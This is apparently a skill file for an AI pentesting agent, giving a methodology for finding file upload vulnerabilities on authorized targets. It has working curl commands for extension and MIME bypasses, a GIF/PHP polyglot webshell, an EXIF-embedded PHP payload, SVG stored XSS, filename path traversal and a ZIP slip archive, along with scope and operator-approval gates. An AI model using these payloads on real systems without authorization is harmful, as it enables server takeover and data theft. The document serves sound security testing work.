---
name: file-upload
description: >
  Hunt for file upload vulnerabilities: extension/content-type/magic-byte
  bypass, path traversal in filenames, polyglot files, and insecure storage
  that leads to webshell execution or stored XSS via served uploads. Use
  when the target has any avatar/document/image/attachment upload feature.
  Keywords: file upload, webshell, extension bypass, content-type, magic
  bytes, polyglot, ImageTragick, ZIP slip, SVG XSS.
  Do NOT use for XXE triggered by uploaded XML/DOCX/SVG parsing internals —
  note the finding here but cross-reference an XXE-specific skill if present.
metadata:
  type: hunt
  phase: hunting
  cwe: [CWE-434, CWE-646, CWE-22, CWE-79]
  mitre_attack: [T1505.003, T1190]
  tools: [burpsuite, curl, exiftool, binwalk, ffuf]
depends_on: [active-recon, web-crawling]
feeds_into: [chain-analysis]
chains_with: [broken-access-control, crlf-injection]
---

## Signals

- Any `<input type="file">`, avatar/profile picture, document/CV upload, chat attachment, import (CSV/XLSX) feature.
- Upload response returns a direct URL to the stored file.
- Uploaded files served from the same origin/domain as the app (not an isolated storage domain).
- Image processing libraries in use (ImageMagick, GraphicsMagick, Pillow) — check via error messages or response headers.

## Prerequisites

- A valid account with upload permission.
- A small set of local test files to upload: benign image, EICAR-style harmless marker file (not real malware), minimal web-shell *stub* for authorized testing only, polyglot GIF/PHP, oversized/zip-bomb-style file for DoS check (use with care, respect scope).
- Know where uploads are served from (same-origin vs CDN/S3) before testing — this changes impact drastically.

## Methodology

1. **Baseline the accepted flow.** Upload a legitimate file, capture the request in Burp, note validation: is it checked by extension, MIME `Content-Type` header, magic bytes, or all three? Note where the file ends up (response URL, predictable path?).

2. **Extension bypass.** Try case variation, double extensions, null-byte-style tricks (legacy stacks), alternate extensions the server might still execute:
   ```bash
   curl -s -i -F "file=@shell.php;filename=shell.php" https://target.com/upload
   curl -s -i -F "file=@shell.php;filename=shell.PHP" https://target.com/upload
   curl -s -i -F "file=@shell.php;filename=shell.php.jpg" https://target.com/upload
   curl -s -i -F "file=@shell.php;filename=shell.pHp5" https://target.com/upload
   curl -s -i -F "file=@shell.php;filename=shell.phtml" https://target.com/upload
   curl -s -i -F "file=@shell.php;filename=shell.php%00.jpg" https://target.com/upload
   curl -s -i -F "file=@shell.php;filename=.htaccess" https://target.com/upload   # re-register handlers if Apache allows .htaccess in upload dir
   ```

3. **Content-Type / MIME bypass.** Server may trust the client-supplied `Content-Type` field instead of sniffing content:
   ```bash
   curl -s -i -F "file=@shell.php;filename=shell.php;type=image/jpeg" https://target.com/upload
   curl -s -i -F "file=@shell.php;filename=shell.php;type=image/png" https://target.com/upload
   ```

4. **Magic-byte / polyglot bypass.** If the server validates the first bytes, prepend a valid image header to an executable payload (GIF89a polyglot):
   ```bash
   printf 'GIF89a;\n<?php system($_GET["c"]); ?>' > polyglot.php
   curl -s -i -F "file=@polyglot.php;filename=polyglot.gif.php;type=image/gif" https://target.com/upload
   # or build with exiftool, embedding payload in EXIF comment of a real JPEG
   exiftool -Comment='<?php system($_GET["c"]); ?>' -o payload.jpg clean.jpg
   ```

5. **SVG-based stored XSS.** SVGs are images but can carry `<script>`:
   ```bash
   cat > xss.svg <<'EOF'
   <svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)">
   <script>alert(document.domain)</script>
   </svg>
   EOF
   curl -s -i -F "file=@xss.svg;type=image/svg+xml" https://target.com/upload
   ```
   Only a finding if the SVG is served with `Content-Type: image/svg+xml` and **not** `Content-Disposition: attachment` from the app's own origin.

6. **Path traversal in filename.** Test whether the server sanitizes the filename before writing to disk:
   ```bash
   curl -s -i -F 'file=@shell.php;filename=../../../../var/www/html/shell.php' https://target.com/upload
   curl -s -i -F 'file=@shell.php;filename=..%2f..%2f..%2fshell.php' https://target.com/upload
   ```

7. **ZIP slip** if the app unzips uploaded archives (bulk import, theme upload):
   ```bash
   mkdir -p evil/../../../tmp/zipslip_poc
   python3 -c "
   import zipfile
   zf = zipfile.ZipFile('evil.zip','w')
   zf.writestr('../../../../tmp/zipslip_poc.txt','poc')
   zf.close()"
   curl -s -i -F "file=@evil.zip" https://target.com/import
   ```

8. **Confirm execution/impact, not just storage.** A file sitting unexecuted on disk is not a finding. After any successful bypass, request the uploaded resource directly and confirm server-side execution or browser-side script execution:
   ```bash
   curl -s https://target.com/uploads/polyglot.gif.php?c=id
   ```
   For SVG XSS, open the served URL in a browser/headless instance and confirm the alert/beacon fires from the app's origin.

9. **Check storage isolation & headers** regardless of execution: are uploads served with `X-Content-Type-Options: nosniff` and `Content-Disposition: attachment`? Missing both on a same-origin upload path is a finding on its own (stored XSS vector) even without achieving RCE.

## Tooling

- `curl -F` for multipart crafting (fastest iteration).
- Burp Repeater for byte-level control over multipart boundaries and headers.
- `exiftool` for EXIF-embedded payloads.
- `binwalk` to inspect what a target's own "antivirus"/content scanner actually parses.
- `ffuf` to brute-force the upload directory for predictable filenames if no URL is returned: `ffuf -u https://target.com/uploads/FUZZ.jpg -w wordlist.txt -mc 200`.

## Root Causes

- Validation based on client-controlled `Content-Type` or filename extension alone, no server-side content sniffing (magic bytes) or re-encoding.
- Executable file types reach a web-servable directory with execute permissions still mapped (PHP handler active in uploads folder).
- No filename sanitization before `os.path.join`/string concatenation to build the storage path.
- Uploaded content served from the app's own origin instead of an isolated storage domain/CDN with forced `Content-Disposition: attachment`.
- Archive extraction without path normalization against the extraction root.

## Validation Gate (minimum proof)

- Command execution: response from the uploaded shell proving code ran server-side (`curl` output of `id`/`whoami` equivalent) — obtain operator sign-off before any further action per project human-gate rules; this already crosses into exploitation.
- Stored XSS via SVG/HTML: screenshot or network log showing the script executing in a browser context under the app's own origin, with the exact served URL and response headers.
- Path traversal write: proof the file landed outside the intended upload directory (e.g. listing it via a secondary read vuln, or server error confirming the path) — do not actually overwrite a sensitive file.
- Always include the full request (headers + multipart body) and response.

## Gotchas

- **Minimum proof:** uploading a `.php` file that gets stored is not RCE — you must retrieve and execute it to claim code execution.
- **Common N/A:** uploads re-encoded through an image library (resize/strip metadata) before storage neutralize most polyglot/EXIF payloads — verify by downloading the stored file back and diffing bytes before spending more time here.
- **Common N/A:** uploads served from a separate storage domain/CDN with no execute permissions and correct `Content-Disposition: attachment` — SVG/HTML XSS impact collapses to near-zero; note as low-severity hardening, not a critical finding.
- **Overclaim trap:** don't report "arbitrary file upload" when only a harmless extension got through — severity hinges entirely on whether the destination executes it or whether it enables XSS on the app's origin.
- Respect scope/CLAUDE.md human gates: uploading a functional webshell and then invoking it is exploitation, not hunting — pause and get operator confirmation before the invocation step if the engagement rules require it.
- Never upload real malware samples; use clearly inert PoC payloads (`system($_GET['c'])`-style stubs are standard industry PoCs, not malware).

## Chain Anchors

Before declaring this finding complete, probe these escalation paths:

1. **Web shell execution** — Can the uploaded file be placed in, or made to execute from, a web-accessible, server-executed path (RCE)?
2. **Bypass consistency** — Does the bypass (double extension, null byte, magic-byte spoofing) work across all upload endpoints, or just one?
3. **Stored XSS via SVG/HTML upload** — Can an uploaded SVG or HTML file achieve stored XSS when served inline?
4. **Path traversal in filename** — Does the filename parameter allow path traversal to overwrite arbitrary files outside the intended upload directory?

A finding without chain anchor results is INCOMPLETE. Record each anchor as
tested/not-applicable/blocked with the reason.

## Chains & Compositions

- Webshell upload + predictable storage path → full RCE chain (requires operator gate before invocation).
- SVG/HTML stored XSS served same-origin → session theft, chains with session-management.
- Path traversal filename → overwrite of application files (`.htaccess`, config) → chains with broken-access-control for the resulting privilege impact.
- ZIP slip → arbitrary file write outside intended directory → potential RCE if it lands in a web root or cron/startup path.
